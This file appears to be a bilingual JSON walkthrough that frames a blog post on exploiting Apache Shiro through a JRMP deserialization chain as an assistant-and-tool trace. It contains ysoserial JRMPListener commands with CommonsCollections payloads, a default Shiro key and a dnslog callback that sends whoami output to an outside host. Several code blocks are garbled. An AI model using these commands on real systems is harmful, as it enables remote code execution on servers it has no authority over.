@@ -1,0 +1,105 @@
+{
+    "_source_md":  "Deser-Walkthrough/2021-06-30-JRMP-Gadget.md",
+    "version":  "jrmp-gadget",
+    "title":  {
+                  "zh":  "Shiro框架深入利用：JRMP-Gadget利用链浅析",
+                  "en":  "Shiro Framework Exploitation: JRMP-Gadget Chain Analysis"
+              },
+    "description":  {
+                        "zh":  "分析Shiro框架JRMP利用链，解释为什么Dnslog显示root而实际shell权限为低权限的原因。",
+                        "en":  "Analyze Shiro framework JRMP exploitation chain, explaining why Dnslog shows root but actual shell has low privileges."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析Shiro JRMP利用链权限问题",
+                                      "en":  "Analyze Shiro JRMP chain privilege issue"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "[*] find: JRMPClient can be use\n0: JRMPClient",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃?bin4xin sudo -l\n\nUser bin4xin may run the following commands on bin4xin\u0027s MacbookPro:\n    (ALL) ALL\n\n鉃?bin4xin (sudo) ping `whoami`.31veg3.dnslog.cn\nPING bin4xin.31veg3.dnslog.cn (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.087 ms\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.163 ms",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "#鏄惁娣诲姞sudo杩斿洖閮藉涓嬶細\n#dnslog杩斿洖璁板綍\nbin4xin.31veg3.dnslog.cn\t61.132.161.4\t2021-07-05 13:44:34\nbin4xin.31veg3.dnslog.cn\t61.132.161.6\t2021-07-05 13:44:34",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃?bin4xin java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections3 \"ping `whoami`.6iep0z.dnslog.cn\"\n* Opening JRMP listener on 8888\n\n#ysoserial.exploit.JRMPListener鍒╃敤绫荤洃鍚姸鎬佷笅锛?鉃?bin4xin ps -ef|grep ping\n\n  501  6895  6696   0  2:37涓嬪崍 ttys004    0:00.54 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections3 ping bin4xin.6iep0z.dnslog.cn",
+                                             "language":  "bash"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "目标识别：通过/a/login路由和jeesite.session.id Cookie识别Shiro+Jeesite CMS",
+                                      "en":  "Target identification: Identify Shiro+Jeesite CMS via /a/login route and jeesite.session.id Cookie"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "exec",
+                      "content":  {
+                                      "zh":  "跑出默认密钥：kPH+bIxk5D2deZiIxcaaaA==",
+                                      "en":  "Found default key: kPH+bIxk5D2deZiIxcaaaA=="
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "exec",
+                      "content":  {
+                                      "zh":  "ysoserial起JRMP监听：java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 \u0027ping `whoami`.x.dnslog.cn\u0027",
+                                      "en":  "ysoserial JRMP listener: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 \u0027ping `whoami`.x.dnslog.cn\u0027"
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "权限问题分析：Dnslog显示root是因为whoami命令在VPS本地执行后转发，而非在受害机器上执行。实际进程为低权限用户运行。",
+                                      "en":  "Privilege issue analysis: Dnslog shows root because whoami command executes locally on VPS before forwarding, not on victim machine. Actual process runs as low-privilege user."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
